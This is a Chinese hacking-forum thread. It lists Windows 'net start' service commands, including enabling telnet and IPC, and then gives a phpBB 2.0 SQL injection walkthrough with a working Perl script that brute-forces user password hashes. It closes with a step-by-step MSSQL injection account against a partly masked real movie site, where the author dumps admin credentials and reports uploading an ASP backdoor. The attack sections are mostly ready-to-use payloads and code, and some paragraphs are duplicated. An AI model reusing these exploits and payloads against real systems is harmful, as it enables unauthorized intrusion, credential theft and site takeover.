2000 的 RPC 子系统。RPC 子系统包括终结点映射器和其他各种 RPC 服务。 
net start "remote procedure call (rpc) service" 

Net start Schedule 
启动“计划”服务。“计划”服务使计算机可以使用 at 命令在指定时间启动程序。 
net start schedule 

Net start Server 
启动“服务器”服务。“服务器”服务使计算机可以共享网络上的资源。 
net start server 

Net start Simple TCP/IP Services 
启动“简单 TCP/IP 服务”服务。该命令只有在安装了 TCP/IP 和“简单 TCP/IP 服务”后 
才可以使用。 
net start "simple tcp/ip services" 
Net start Site Server LDAP Service 
启动“Site Server LDAP 服务”。“Site Server LDAP 服务”在 Windows 2000 Active D 
irectory 中发布 IP 多播会议。该命令只有在安装了“Site Server LDAP 服务”后才可以使 
用。 
net start "site server ldap service" 

Net start SNMP 
启动 SNMP 服务。SNMP 服务允许服务器向 TCP/IP 网络上的 SNMP 管理系统报告当前状态。 
该命令只有在安装了 TCP/IP 和 SNMP 后才可以使用。 
net start snmp 

Net start Spooler 
启动“后台打印程序”。 
net start spooler 
Net start TCP/IP NetBIOS Helper 
在 TCP 服务上启用 Netbios 支持。该命令只有在安装了 TCP/IP 才可用。 
net start "tcp/ip netbios helper" 
Net start UPS 
启动“不间断电源 (UPS)”服务 
net start ups 

Net start Windows Internet Name Service 
启动“Windows Internet 命名服务”。该命令只有在安装了 TCP/IP 和“Windows Interne 
t 命名服务”后在 Windows 2000 Servers 上才可以使用。 
net start "windows internet name service" 

Net start Workstation 
启动“工作站”服务。“工作站”服务使计算机可以连接并使用网络资源。 
net start workstation 
Net start Schedule 
有的地方称为“定时”服务，叫法不同，请大家注意了，其实是一回事！ 
Net start Telnet 
启动telnet服务，打开23端口，有的情况下需先运行NTLM.exe。为什么？到榕G的说明里去找 
吧！ 
net start workstation 
打开NET USE 
net start lanmanserver 
打开 IPC 服务。 
开FTP命令是：net start msftpsvc 
Net start 
启动服务，或显示已启动服务的列表。两个或多个词组成的服务名，例如 Net Logon 或 Co 
mputer Browser，必须两边加引号 (")。 
net start [service] 
参数 
无 
键入不带参数的 net start 显示正在运行服务的列表。 
service 
包括 alerter、client service for netware、clipbook server、content index、comput 
er browser、dhcp client、directory replicator、eventlog、ftp publishing service、 
hypermedia object manager、logical disk manager、lpdsvc、media services managemen 
t, messenger、Fax Service、Microsoft install server、net logon、network dde、netw 
ork dde dsdm、nt lm security support provider、ole、plug and play、remote access 
connection manager、remote access isnsap service、remote access server、remote pr 
ocedure call (rpc) locator、remote procedure call (rpc) service、schedule、server 
、simple tcp/ip services、site server ldap service、smartcard resource manager、s 
nmp、spooler、task scheduler、tcp/ip netbios helper、telephony service、tracking 
service、tracking (server) service、ups、Windows time service 和 workstation。 
下面服务只有在 Windows 2000 上可用：file service for macintosh、gateway service 
for netware、microsoft dhcp service、print service for macintosh、windows interne 
t name service。 

Net start Alerter 
启动“警报器”服务。“警报器”服务发送警告消息。 
Net start Alerter 
Net start Client Service for NetWare 
启动“NetWare 客户服务”。该命令只有在安装了 NetWare 客户服务的情况下才能在 Wind 
ows 2000 Professional 上使用。 
net start "client service for netware" 
Net start ClipBook Server 
启动“剪贴簿服务器”服务。两个单词组成的服务名，例如 ClipBook Server，必须两边加 
引号 (")。 
net start "clipbook server" 

Net start Computer Browser 
启动“计算机浏览器”服务。 
net start "computer browser" 








--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:11pm 

NET START可以起用命令一览表（下） 



Net start DHCP Client 
启动“DHCP 客户”服务。该命令只有在安装了 TCP/IP 协议之后才可用。 
net start "dhcp client" 

Net start Directory Replicator 
启动“目录复制程序”服务。“目录复制程序”服务将指定的文件复制到指定服务器上。两 
个词组成的服务名，例如 Directory Replicator，必须两边加引号 (")。也可以用命令 net 
start replicator 启动该服务。 
net start "directory replicator" 

Net start Eventlog 
启动“事件日志”服务，该服务将事件记录在本地计算机上。必须在使用事件查看器查看记 
录的事件之前启动该服务。 
net start Eventlog 

Net start File Server for Macintosh 
启动 Macintosh 文件服务，允许 Macintosh 计算机使用共享文件。该命令只能在运行 Win 
dows 2000 Server 的计算机上可用。 
net start "file service for macintosh" 
Net start FTP Publishing Service 
启动 FTP 发布服务。该命令只有在安装了 Internet 信息服务后才可用。 
net start "ftp publishing service" 
Net start Gateway Service for NetWare 
启动 NetWare 网关服务。该命令只有在安装了 NetWare 网关服务的情况下才能在 Windows 
2000 Server 上可用。 
net start "gateway service for netware" 
Net start Lpdsvc 
启动 TCP/IP 打印服务器服务。该命令只有在 UNIX 打印服务和 TCP/IP 协议安装后方可使 
用。 
net start lpdsvc 

Net start Messenger 
启动“信使”服务。“信使”服务允许计算机接收邮件。 
net start messenger 

Net start Microsoft DHCP Service 
启动 Microsoft DHCP 服务。该命令只有在运行 Windows 2000 Server 并且已安装 TCP/IP 
协议和 DHCP 服务的情况下才可用。 
net start "microsoft dhcp service" 

Net start Net Logon 
启动“网络登录”服务。“网络登录”服务验证登录请求并控制复制用户帐户数据库域宽。 
两个词组成的服务名，例如 Net Logon，必须两边加引号 (")。该服务也可以使用命令 net 
start netlogon 启动。 
net start "net logon" 

Net start Network DDE 
启动“网络 DDE”服务。 
net start "network dde" 
Net start NT LM Security Support Provider 
启动“NT LM 安全支持提供程序”服务。该命令只有在安装了“NT LM 安全支持提供程序” 
后才可用。 
net start "nt lm security support provider" 
Net start OLE 
启动对象链接和嵌入服务。 
net start ole 
Net start Print Server for Macintosh 
启动 Macintosh 打印服务器服务，允许从 Macintosh 计算机打印。该命令只能在运行 Win 
dows 2000 Server 的计算机上可用。 
net start "print server for macintosh" 
Net start Remote Access Connection Manager 
启动“远程访问连接管理器”服务。该命令只有在安装了“远程访问服务”后才可用。 
net start "remote access connection manager" 
Net start Remote Access ISNSAP Service 
启动“远程访问 ISNSAP 服务”。该命令只有在安装了“远程访问服务”后才可用。 
net start "remote access isnsap service" 
Net start Remote Procedure Call (RPC) Locator 
启动 RPC 定位器服务。“定位器”服务是 Microsoft Windows 2000 的 RPC 名称服务。 
net start "remote procedure call (rpc) locator" 

Net start Remote Procedure Call (RPC) Service 
启动“远程过程调用 (RPC) 服务”。“远程过程调用 (RPC) 服务”是 Microsoft Windows 
2000 的 RPC 子系统。RPC 子系统包括终结点映射器和其他各种 RPC 服务。 
net start "remote procedure call (rpc) service" 

Net start Schedule 
启动“计划”服务。“计划”服务使计算机可以使用 at 命令在指定时间启动程序。 
net start schedule 

Net start Server 
启动“服务器”服务。“服务器”服务使计算机可以共享网络上的资源。 
net start server 

Net start Simple TCP/IP Services 
启动“简单 TCP/IP 服务”服务。该命令只有在安装了 TCP/IP 和“简单 TCP/IP 服务”后 
才可以使用。 
net start "simple tcp/ip services" 
Net start Site Server LDAP Service 
启动“Site Server LDAP 服务”。“Site Server LDAP 服务”在 Windows 2000 Active D 
irectory 中发布 IP 多播会议。该命令只有在安装了“Site Server LDAP 服务”后才可以使 
用。 
net start "site server ldap service" 

Net start SNMP 
启动 SNMP 服务。SNMP 服务允许服务器向 TCP/IP 网络上的 SNMP 管理系统报告当前状态。 
该命令只有在安装了 TCP/IP 和 SNMP 后才可以使用。 
net start snmp 

Net start Spooler 
启动“后台打印程序”。 
net start spooler 
Net start TCP/IP NetBIOS Helper 
在 TCP 服务上启用 Netbios 支持。该命令只有在安装了 TCP/IP 才可用。 
net start "tcp/ip netbios helper" 
Net start UPS 
启动“不间断电源 (UPS)”服务 
net start ups 

Net start Windows Internet Name Service 
启动“Windows Internet 命名服务”。该命令只有在安装了 TCP/IP 和“Windows Interne 
t 命名服务”后在 Windows 2000 Servers 上才可以使用。 
net start "windows internet name service" 

Net start Workstation 
启动“工作站”服务。“工作站”服务使计算机可以连接并使用网络资源。 
net start workstation 
Net start Schedule 
有的地方称为“定时”服务，叫法不同，请大家注意了，其实是一回事！ 
Net start Telnet 
启动telnet服务，打开23端口，有的情况下需先运行NTLM.exe。为什么？到榕G的说明里去找 
吧！ 
net start workstation 
打开NET USE 
net start lanmanserver 
打开 IPC 服务。 
net start msftpsvc






--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:12pm 

PHP注入实例 

在网上很难看到一篇完整的关于php注入的文章和利用代码,于是我自已把mysql和php硬啃了几个星期，下面说说我的休会吧,希望能抛砖引玉! 
相信大家对asp的注入已经是十分熟悉了,而对php的注入比asp要困难,因为php的magic_gpc选项确实让人头疼,在注入中不要出现引号,而php大多和mysql结合,而mysql的功能上的缺点,从另外一人角度看确在一定程度上防止了sql njection的攻击,我在这里就举一个实例吧,我以phpbb2.0为例: 
在viewforum.php中有一个变量没过滤: 
if ( isset($HTTP_GET_VARS<pOST_FORUM_URL]) ││ isset($HTTP_POST_VARS<pOST_FORUM_URL]) ) 
{ 
$forum_id = ( isset($HTTP_GET_VARS<pOST_FORUM_URL]) ) ? intval($HTTP_GET_VARS<pOST_FORUM_URL]): intval 

($HTTP_POST_VARS<pOST_FORUM_URL]); 
} 
else if ( isset($HTTP_GET_VARS['forum'])) 
{ 
$forum_id = $HTTP_GET_VARS['forum']; 
} 
else 
{ 
$forum_id = ''; 
} 
就是这个forum,而下面直接把它放进了查询中: 
if ( !empty($forum_id) ) 
{ 
$sql = "SELECT * 
FROM " . FORUMS_TABLE . " 
WHERE forum_id = $forum_id"; 
if ( !($result = $db->sql_query($sql)) ) 
{ 
message_die(GENERAL_ERROR, 'Could not obtain forums information', '', __LINE__, __FILE__, $sql); 
} 
} 
else 
{ 
message_die(GENERAL_MESSAGE, 'Forum_not_exist'); 
} 

如果是asp的话，相信很多人都会注入了.如果这个forum_id指定的论坛不存在的话，就会使$result为空，于是返回Could not obtain forums information的信息,于是下面的代码就不能执行下去了 
// 
// If the query doesn't return any rows this isn't a valid forum. Inform 
// the user. 
// 
if ( !($forum_row = $db->sql_fetchrow($result)) ) 
{ 
message_die(GENERAL_MESSAGE, 'Forum_not_exist'); 
} 

// 
// Start session management 
// 
$userdata = session_pagestart($user_ip, $forum_id) /**************************************** 

关键就是打星号的那一行了,这里是一个函数session_pagestart($user_ip, $thispage_id),这是在session.php中定义的一个函数,由于代码太 

长，就不全贴出来了,有兴趣的可以自已看看，关键是这个函数还调用了session_begin(),函数调用如下session_begin($user_id, $user_ip, 

$thispage_id, TRUE))，同样是在这个文件中定义的,其中有如下代码 
$sql = "UPDATE " . SESSIONS_TABLE . " 
SET session_user_id = $user_id, session_start = $current_time, session_time = $current_time, session_page = 

$page_id, session_logged_in = $login 
WHERE session_id = '" . $session_id . "' 
AND session_ip = '$user_ip'"; 
if ( !($result = $db->sql_query($sql)) ││ !$db->sql_affectedrows() ) 
{ 
$session_id = md5(uniqid($user_ip)); 

$sql = "INSERT INTO " . SESSIONS_TABLE . " 
(session_id, session_user_id, session_start, session_time, session_ip, session_page, 

session_logged_in) 
VALUES ('$session_id', $user_id, $current_time, $current_time, '$user_ip', $page_id, $login)"; 
if ( !($result = $db->sql_query($sql)) ) 
{ 
message_die(CRITICAL_ERROR, 'Error creating new session : session_begin', '', __LINE__, __FILE__, 

$sql); 
} 


在这里有个session_page在mysql中定义的是个整形数,他的$page_id,也就是$forum_id,如果插入的不是整形就会报错了,就会出现Error 

creating new session : session_begin的提示,所以要指这$forum_id的值很重要,所以我把它指定为:-1%20union%20select%201,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20from%20phpbb_users%20where%20user_id=2%20and%20ord(substring(user_password,1,1))=57,没有引号吧!虽然指定的是一个不存在的forum_id但他返回的查询结果可不一定是为空,这个就是猜user_id为2的用户的第一位密码的ascii码值是是否为57,如果是的话文章中第一段代码中的$result可不为空了,于是就执行了ession_pagestart这个有问题的函数，插入的不是整数当然就要出错了，于是就显示Error creating new session : session_begin,就表明你猜对了第一位了，其它位类似. 

如果没有这句出错信息的话我想即使注入成功也很难判断是否已经成功，看来出错信息也很有帮助啊.分析就到这里，下面附上一段测试代码，这段代码只要稍加修改就能适用于其它类似的猜md5密码的情况,这里我用的英文版的返回条件，中文和其它语言的只要改一下返回条件就行了. 

use HTTP::Request::Common; 
use HTTP::Response; 
use LWP::UserAgent; 
$ua = new LWP::UserAgent; 

print " ***********************\n"; 
print " phpbb viewforum.php exp\n"; 
print " code by pinkeyes\n"; 
print " www.icehack.com\n"; 
print " ************************\n"; 
print "please enter the weak file's url:\n"; 
print "e.g. http://192.168.1.4/phpBB2/viewforum.php\n"; 
$adr=<STDIN>; 
chomp($adr); 
print "please enter the user_id that you want to crack\n"; 
$u=<STDIN>; 
chomp($u); 
print "work starting,please wait!\n"; 
@pink=(48..57); 
@pink=(@pink,97..102); 
for($j=1;$j<=32;$j++){ 
for ($i=0;$i<@pink;$i++){ 
$url=$adr."?forum=-1%20union%20select%201,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20from%20phpbb_users%20where% 

20user_id=$u%20and%20ord(substring(user_password,$j,1))=$pink[$i]"; 
$request = HTTP::Request->new('GET', "$url"); 
$response = $ua->request($request); 

if ($response->is_success) { 
if ($response->content =~ /Error creating new session/) { 
$pwd.=chr($pink[$i]); 
print "$pwd\n"; 
} 

} 
} 
} 
if ($pwd ne ""){ 
print "successfully,The password is $pwd,good luck\n";} 
else{ 
print "bad luck,work failed!\n";} 

至于以前的phpbb2.0.6的search.php的问题利用程序只要将上面代码稍加修改就行了。 

主要是看过程，学习作者思维！
SQL注入新技巧 


SQL注入的新技巧 
表名和字段名的获得 
适用情况: 
1)数据库是MSSQL 
2)连接数据库的只是普通用户 
3)不知道ASP源代码 

可以进行的攻击 
1)对数据内容进行添加，查看，更改 

实例: 
本文件以 
http://www.dy***.com/user/wantpws.asp 
为列进行测试攻击。 

第一步: 
在输入用户名处输入单引号，显示 
Microsoft OLE DB Provider for SQL Server 错误 '80040e14' 
字符串 ''' 之前有未闭合的引号。 

/user/wantpws.asp，行63 

说明没有过滤单引号且数据库是MSSQL. 

第二步: 
输入a';use master;-- 
显示 
Microsoft OLE DB Provider for SQL Server 错误 '80040e21' 
多步 OLE DB 操作产生错误。如果可能，请检查每个 OLE DB 状态值。没有工作被完成。 

/user/wantpws.asp，行63 
这样说明没有权限了。 

第三步: 
输入:a' or name like 'fff%';-- 
显示有一个叫ffff的用户哈。 

第四步: 
在用户名处输入 
ffff' and 1<>(select count(email) from [user]);-- 
显示: 
Microsoft OLE DB Provider for SQL Server 错误 '80040e37' 
对象名 'user' 无效。 

/user/wantpws.asp，行96 

说明没有叫user的表，换成users试试成功,同时说明有一个叫email的列. 
(东方飘云的一个办法是输入a' having 1=1-- 
一般返回如下也就可以直接得到表名和一个字段名了 
Microsoft OLE DB Provider for SQL Server 错误 '80040e14' 
列 'users.ID' 在选择列表中无效，因为该列未包含在聚合函数中，并且没有 GROUP BY 子句。 

/user/wantpws.asp，行63 


) 

现在我们知道了ffff用户的密码是111111. 

下面通过语句得到数据库中的所有表名和字段名。 

第五步: 
输入: 
ffff';update [users] set email=(select top 1 name from sysobjects where xtype='u' and status>0) where name='ffff';-- 
说明: 
上面的语句是得到数据库中的第一个用户表,并把表名放在ffff用户的邮箱字段中。 
通过查看ffff的用户资料可得第一个用表叫ad 
然后根据表名ad得到这个表的ID 
ffff';update [users] set email=(select top 1 id from sysobjects where xtype='u' and name='ad') where name='ffff';-- 
同上可知id是:581577110 
由于对象标志id是根据由小到大排列的所以我们可以得到所有的用户表的名字了 
象下面这样就可以得到第二个表的名字了 
ffff';update [users] set email=(select top 1 name from sysobjects where xtype='u' and id>581577110) where name='ffff';-- 

ad 581577110 
users 597577167 
buy 613577224 
car 629577281 
learning 645577338 
log 661577395 
movie 677577452 
movieurl 693577509 
password 709577566 
type 725577623 
talk 

经过一段时间的猜测后我们得到上面的分析一下应该明白password,users是最得要的 

第六步:猜重要表的字段 
输入: 
现在就看看users表有哪些字段 
ffff';update [users] set email=(select top 1 col_name(object_id('users'),3) from users) where name='ffff';-- 
得到第三个字段是password 
ffff';update [users] set email=(select top 1 col_name(object_id('users'),4) from users) where name='ffff';-- 
得到第四个字段是name 
最后users表的字段共28个全得到了 
(注:另一个得到字段的办法,前提是系统的返回出错信息 
a' group by ID having 1=1-- 
得到 
Microsoft OLE DB Provider for SQL Server 错误 '80040e14' 
列 'users.userid' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。 

/user/wantpws.asp，行63 
这个第二个字段就是userid 
显示第三个字段。 
a' group by id,userid having 1=1-- 

Microsoft OLE DB Provider for SQL Server 错误 '80040e14' 
列 'users.password' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。 

/user/wantpws.asp，行63 
得到是password 
同理，一直显示出所有。：） 
) 

users表 
1 2 3 4 
id userid password name 

5 6 7 8 9 10 11 12 13 14 15 16 
Province homeaddress city adress starlook sex email nlook nos date money send 

17 18 19 20 21 22 23 24 25 26 27 28 
oklook dnlook lasthits phone askmejoin getmoney payno logintime mflag state post note 


starlook--12 10 2003 2:41PM 
nlook---0 
nos---2 登陆次数 
date--12 10 2003 12:00AM 注册时间? 
money--同上 
send--空 
oklook--0 
dnlook--0 
getmoney--0 
state--0 
note--这家伙很。。。 说明 

password表 
1 2 3 
id name pwd 

然后我又试ad原来是用来记录广告击点的。。 
然后又试password表得到有name和pwd字段。 
执行 
ffff';update [users] set email=(select top 1 name from password) where name='ffff';-- 
可得第一个用户名是admin123看样儿多半是管理员了。 
然后又得到了密码是dy***dick188还是打星号算了哈哈... 

这样我们就完全进入了这个电影网站的后台了哈哈。 
http://www.dy***.com/login.asp 

再进一步还可以知道管理员一共有三人密码也都能看到了。 
ffff';update [users] set email=(select top 1 count(id) from password) where name='ffff';-- 
ffff';update [users] set email=(select top 1 pwd from password where id=2) where name='ffff';-- 

ffff';update [users] set email=(select top 1 name from password where id=2) where name='ffff';-- 


只是能免费看电影好象还不够哈..我看了看它的后台管理原来在 
添加电影的地方对于上传的图片没有过滤.asa的文件,这样我就 
能上传一个asp后门并执行.
只是能免费看电影好象还不够哈..我看了看它的后台管理原来在 
添加电影的地方对于上传的图片没有过滤.asa的文件,这样我就 
能上传一个asp后门并执行.
只是能免费看电影好象还不够哈..我看了看它的后台管理原来在 
添加电影的地方对于上传的图片没有过滤.asa的文件,这样我就 
能上传一个asp后门并执行.
/////////////////防伪///////////////////////////////////////////
(全文完）
